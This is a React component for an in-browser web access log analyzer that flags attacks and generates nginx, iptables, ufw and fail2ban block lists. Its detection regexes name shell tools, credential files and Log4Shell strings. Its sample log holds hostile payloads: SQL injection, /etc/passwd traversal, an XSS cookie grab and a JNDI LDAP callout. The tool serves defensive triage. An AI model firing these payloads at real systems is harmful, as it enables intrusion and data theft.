import { useMemo, useState } from 'react';
import { Stack, SimpleGrid, Table, Badge, Text, Group, Button, Chip, SegmentedControl, NumberInput, Paper } from '@mantine/core';
import { InputArea, OutputArea, Panel, Stat, PrivacyNote } from '@/shared/components/ui';

// Apache/Nginx "combined" (and "common") log format.
const LINE = /^(\S+) \S+ (\S+) \[([^\]]+)\] "(\S+) ?(\S*) ?([^"]*)" (\d{3}) (\S+)(?: "([^"]*)" "([^"]*)")?/;

const RULES = [
  { id: 'sqli', label: 'SQL injection', sev: 'high', re: /(union(\s|\+|%20)+(all(\s|\+|%20)+)?select|'\s*(or|and)\s*'?\d|%27(%20|\+)*(or|and)|sleep\(\d|benchmark\(|information_schema|extractvalue\(|waitfor(\s|%20)+delay|\bor\b\s+1=1)/i },
  { id: 'xss', label: 'XSS', sev: 'high', re: /(<script|%3cscript|javascript:|onerror\s*=|onload\s*=|%3csvg|<svg|alert\(|document\.cookie)/i },
  { id: 'traversal', label: 'Path traversal / LFI', sev: 'high', re: /(\.\.\/|\.\.%2f|%2e%2e%2f|%252e%252e|\/etc\/passwd|\/proc\/self|boot\.ini|win\.ini|php:\/\/filter)/i },
  { id: 'rce', label: 'Command injection / RCE', sev: 'critical', re: /(;|%3b|\||%7c|`|\$\(|%24%28)\s*(cat|id|whoami|wget|curl|nc|bash|sh|powershell)\b|\$\{jndi:|%24%7bjndi|\(\)\s*\{\s*:;\s*\}|cmd=|exec=/i },
  { id: 'files', label: 'Sensitive file probe', sev: 'medium', re: /\/(\.env|\.git\/|\.svn|\.htpasswd|\.DS_Store|wp-config\.php|config\.php\.bak|backup\.(zip|sql|tar)|dump\.sql|id_rsa|\.aws\/credentials|server-status|phpinfo\.php)/i },
  { id: 'admin', label: 'Admin panel probe', sev: 'low', re: /\/(phpmyadmin|pma|adminer|wp-admin|wp-login\.php|administrator|manager\/html|actuator|_ignition|solr\/admin|cgi-bin)/i },
  { id: 'scanner', label: 'Scanner user-agent', sev: 'medium', ua: true, re: /(sqlmap|nikto|nmap|masscan|zgrab|gobuster|dirbuster|dirb|wfuzz|ffuf|nuclei|acunetix|nessus|openvas|wpscan|hydra|whatweb|feroxbuster|httpx|python-requests|go-http-client|curl\/|libwww-perl)/i },
];

const SEV_COLOR = { critical: 'red', high: 'orange', medium: 'yellow', low: 'blue' };

const SAMPLE = [
  '203.0.113.7 - - [12/Nov/2024:10:01:02 +0000] "GET / HTTP/1.1" 200 5123 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
  '198.51.100.23 - - [12/Nov/2024:10:01:05 +0000] "GET /products.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 500 312 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"',
  '198.51.100.23 - - [12/Nov/2024:10:01:06 +0000] "GET /products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 4410 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"',
  '192.0.2.44 - - [12/Nov/2024:10:02:11 +0000] "GET /.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"',
  '192.0.2.44 - - [12/Nov/2024:10:02:12 +0000] "GET /.git/config HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"',
  '192.0.2.44 - - [12/Nov/2024:10:02:13 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"',
  '203.0.113.99 - - [12/Nov/2024:10:03:00 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 199 "-" "curl/8.4.0"',
  '203.0.113.150 - - [12/Nov/2024:10:03:30 +0000] "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 2211 "-" "Mozilla/5.0"',
  '45.95.147.2 - - [12/Nov/2024:10:04:00 +0000] "GET /?x=${jndi:ldap://45.95.147.2:1389/a} HTTP/1.1" 400 0 "-" "${jndi:ldap://45.95.147.2:1389/a}"',
  ...Array.from({ length: 14 }, (_, i) => `185.220.101.45 - - [12/Nov/2024:10:05:${String(10 + i).padStart(2, '0')} +0000] "POST /wp-login.php HTTP/1.1" 401 512 "-" "Mozilla/5.0"`),
  '203.0.113.7 - - [12/Nov/2024:10:06:00 +0000] "GET /assets/app.css HTTP/1.1" 200 20431 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
].join('\n');

export default function LogAnalyzer() {
  const [input, setInput] = useState(SAMPLE);
  const [filter, setFilter] = useState([]);
  const [bfThreshold, setBfThreshold] = useState(10);
  const [fmt, setFmt] = useState('nginx');

  const r = useMemo(() => {
    const lines = input.split(/\r?\n/).filter(Boolean).slice(0, 200000);
    const hits = []; const ips = new Map(); const status = {}; const paths = new Map(); let parsed = 0;
    for (const line of lines) {
      const m = line.match(LINE);
      if (!m) continue;
      parsed++;
      const [, ip, , time, method, path, , code, , , ua = ''] = m;
      let decoded = path; try { decoded = decodeURIComponent(path.replace(/\+/g, ' ')); } catch { /* keep raw */ }
      const ipStat = ips.get(ip) || { ip, total: 0, errors: 0, authFail: 0, rules: new Set() };
      ipStat.total++; if (code >= 400) ipStat.errors++; if (code === '401' || code === '403' || (method === 'POST' && /login|signin|auth|xmlrpc/i.test(path))) ipStat.authFail++;
      status[code[0] + 'xx'] = (status[code[0] + 'xx'] || 0) + 1;
      paths.set(path.split('?')[0], (paths.get(path.split('?')[0]) || 0) + 1);
      const matched = RULES.filter((rule) => rule.re.test(rule.ua ? ua : `${path} ${decoded}`) || (rule.id === 'rce' && rule.re.test(ua)));
      matched.forEach((rule) => ipStat.rules.add(rule.id));
      if (matched.length) hits.push({ ip, time, method, path, code, ua, rules: matched });
      ips.set(ip, ipStat);
    }
    const brute = [...ips.values()].filter((s) => s.authFail >= bfThreshold);
    brute.forEach((s) => s.rules.add('bruteforce'));
    const offenders = [...ips.values()].filter((s) => s.rules.size).sort((a, b) => b.rules.size - a.rules.size || b.total - a.total);
    return { total: lines.length, parsed, hits, offenders, status, brute, topPaths: [...paths.entries()].sort((a, b) => b[1] - a[1]).slice(0, 8) };
  }, [input, bfThreshold]);

  const shown = filter.length ? r.hits.filter((h) => h.rules.some((x) => filter.includes(x.id))) : r.hits;
  const ipsToBlock = r.offenders.map((o) => o.ip).filter((ip) => /^[\d.:a-f]+$/i.test(ip));
  const blocklist = {
    nginx: ipsToBlock.map((ip) => `deny ${ip};`).join('\n'),
    apache: `<RequireAll>\n  Require all granted\n${ipsToBlock.map((ip) => `  Require not ip ${ip}`).join('\n')}\n</RequireAll>`,
    iptables: ipsToBlock.map((ip) => `${ip.includes(':') ? 'ip6tables' : 'iptables'} -A INPUT -s ${ip} -j DROP`).join('\n'),
    ufw: ipsToBlock.map((ip) => `ufw insert 1 deny from ${ip}`).join('\n'),
    fail2ban: `# /etc/fail2ban/filter.d/web-attacks.conf\n[Definition]\nfailregex = ^<HOST> .*"(GET|POST|HEAD) [^"]*(union.*select|\\.\\./|/etc/passwd|<script|\\$\\{jndi:|/\\.env|/\\.git/)[^"]*"\n\n# /etc/fail2ban/jail.local\n[web-attacks]\nenabled  = true\nport     = http,https\nfilter   = web-attacks\nlogpath  = /var/log/nginx/access.log\nmaxretry = 3\nbantime  = 86400`,
  }[fmt];

  return (
    <Stack gap="md">
      <InputArea label="Access log (Apache / Nginx combined format)" value={input} onChange={setInput} minRows={6} maxRows={14}
        actions={<Button size="compact-xs" variant="subtle" onClick={() => setInput(SAMPLE)}>Attack sample</Button>} />
      <SimpleGrid cols={{ base: 2, sm: 4 }}>
        <Stat label="Lines parsed" value={`${r.parsed}/${r.total}`} />
        <Stat label="Suspicious requests" value={r.hits.length} color={r.hits.length ? 'orange' : undefined} />
        <Stat label="Attacking IPs" value={r.offenders.length} color={r.offenders.length ? 'red' : undefined} />
        <Stat label="Status mix" value={Object.entries(r.status).sort().map(([k, v]) => `${k}:${v}`).join(' ') || '—'} />
      </SimpleGrid>
      <SimpleGrid cols={{ base: 1, lg: 2 }}>
        <Panel title="Offending IPs">
          <Group mb="xs" gap="xs"><Text size="xs" c="dimmed">Brute-force threshold</Text><NumberInput size="xs" w={70} min={2} max={1000} value={bfThreshold} onChange={(v) => setBfThreshold(Number(v) || 10)} /><Text size="xs" c="dimmed">failed logins</Text></Group>
          <Table.ScrollContainer minWidth={380}>
            <Table fz="xs" verticalSpacing={4} striped>
              <Table.Thead><Table.Tr><Table.Th>IP</Table.Th><Table.Th>Requests</Table.Th><Table.Th>Errors</Table.Th><Table.Th>Behaviour</Table.Th></Table.Tr></Table.Thead>
              <Table.Tbody>
                {r.offenders.slice(0, 50).map((o) => (
                  <Table.Tr key={o.ip}>
                    <Table.Td ff="monospace" fw={600}>{o.ip}</Table.Td><Table.Td>{o.total}</Table.Td><Table.Td>{o.errors}</Table.Td>
                    <Table.Td><Group gap={3}>{[...o.rules].map((id) => <Badge key={id} size="xs" variant="light" color={id === 'bruteforce' ? 'red' : SEV_COLOR[RULES.find((x) => x.id === id)?.sev]}>{id === 'bruteforce' ? 'brute force' : RULES.find((x) => x.id === id)?.label}</Badge>)}</Group></Table.Td>
                  </Table.Tr>
                ))}
              </Table.Tbody>
            </Table>
          </Table.ScrollContainer>
          {!r.offenders.length && <Text size="sm" c="dimmed">No attacks detected.</Text>}
        </Panel>
        <Stack gap="md">
          <Panel title="Block list" actions={<SegmentedControl size="xs" value={fmt} onChange={setFmt} data={['nginx', 'apache', 'iptables', 'ufw', 'fail2ban']} />}>
            <OutputArea label={`${fmt} rules`} value={blocklist} minRows={5} filename={`blocklist-${fmt}.conf`} />
          </Panel>
          <Panel title="Top paths">
            {r.topPaths.map(([p, n]) => <Group key={p} justify="space-between" wrap="nowrap"><Text size="xs" ff="monospace" truncate>{p}</Text><Text size="xs" c="dimmed">{n}</Text></Group>)}
          </Panel>
        </Stack>
      </SimpleGrid>
      <Panel title={`Suspicious requests (${shown.length})`}>
        <Chip.Group multiple value={filter} onChange={setFilter}>
          <Group gap={6} mb="sm">{RULES.map((rule) => <Chip key={rule.id} value={rule.id} size="xs" variant="light" color={SEV_COLOR[rule.sev]}>{rule.label} ({r.hits.filter((h) => h.rules.some((x) => x.id === rule.id)).length})</Chip>)}</Group>
        </Chip.Group>
        <Table.ScrollContainer minWidth={700}>
          <Table fz="xs" verticalSpacing={4} striped>
            <Table.Thead><Table.Tr><Table.Th>Time</Table.Th><Table.Th>IP</Table.Th><Table.Th>Request</Table.Th><Table.Th>Status</Table.Th><Table.Th>Detected</Table.Th></Table.Tr></Table.Thead>
            <Table.Tbody>
              {shown.slice(0, 500).map((h, i) => (
                <Table.Tr key={i}>
                  <Table.Td style={{ whiteSpace: 'nowrap' }}>{h.time.split(' ')[0]}</Table.Td>
                  <Table.Td ff="monospace">{h.ip}</Table.Td>
                  <Table.Td ff="monospace" style={{ wordBreak: 'break-all', maxWidth: 420 }}>{h.method} {h.path}</Table.Td>
                  <Table.Td><Badge size="xs" variant="light" color={h.code < 300 ? 'red' : h.code < 400 ? 'yellow' : 'gray'}>{h.code}</Badge></Table.Td>
                  <Table.Td><Group gap={3}>{h.rules.map((x) => <Badge key={x.id} size="xs" color={SEV_COLOR[x.sev]} variant="light">{x.label}</Badge>)}</Group></Table.Td>
                </Table.Tr>
              ))}
            </Table.Tbody>
          </Table>
        </Table.ScrollContainer>
        <Text size="xs" c="dimmed" mt="xs">A <b>2xx</b> status on an attack request is the one to investigate first — the server may have processed it.</Text>
      </Panel>
      <Paper p="xs"><PrivacyNote>Logs are analysed in your browser (up to 200k lines). Signature-based — attackers can evade it, so treat it as triage, not proof.</PrivacyNote></Paper>
    </Stack>
  );
}
